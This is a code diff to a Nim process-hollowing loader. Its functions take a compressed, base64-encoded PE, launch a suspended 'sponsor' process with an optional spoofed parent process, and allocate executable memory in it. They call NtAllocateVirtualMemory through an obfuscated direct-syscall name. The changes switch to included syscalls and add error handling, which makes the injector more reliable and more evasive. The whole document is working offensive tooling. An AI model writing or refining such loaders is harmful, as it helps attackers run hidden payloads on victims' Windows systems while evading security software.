@@ -2,10 +2,10 @@ import os
 import utils
 import winim
 import ptr_math
-import syscalls
 import nimprotect
 import std/strutils
 from zip/zlib import uncompress
+include syscalls
 
 
 proc simpleHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0): bool =
@@ -144,7 +144,7 @@ proc nimlineHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0
     var peImageSectionsHeader = cast[ptr IMAGE_SECTION_HEADER](cast[size_t](peImageNtHeaders) + sizeof(IMAGE_NT_HEADERS))
     var peImageSizeOfHeaders = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfHeaders)
     var peImageSize = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfImage)
-    var peImageImageBase = cast[LPVOID](peImageNtHeaders.OptionalHeader.ImageBase)
+    var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
     var peImageEntryPoint = cast[PVOID](peImageNtHeaders.OptionalHeader.AddressOfEntryPoint)
     
     # Create sponsor process suspended
@@ -190,17 +190,16 @@ proc nimlineHollow(compressedBase64PE: string, sponsorCmd: LPCSTR, ppid: int = 0
 
     # Allocate memory in sponsor process
     when not defined(release): echo "[*] Allocating memory in sponsor process"     
-    var nt = CbZGEMmsvlfsZxPo(
+    if CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
         sponsorProcessHandle,
         addr peImageImageBase,
         0,
         addr peImageSize,
         MEM_COMMIT or MEM_RESERVE,
         PAGE_EXECUTE_READWRITE
-    )
-    echo $nt
-    
-    discard execShellCmd("pause")
+    ) != 0:
+        when not defined(release): echo "[-] Could not allocate memory at sponsor process at address 0x" & $cast[int](peImageImageBase).toHex
+        quit() 
 
     when not defined(release): echo "[i] New image base address (preferred): 0x" & $cast[int](peImageImageBase).toHex 
     when not defined(release): echo "[i] New entrypoint: 0x" & $(cast[int](peImageImageBase) + cast[int](peImageEntryPoint)).toHex 
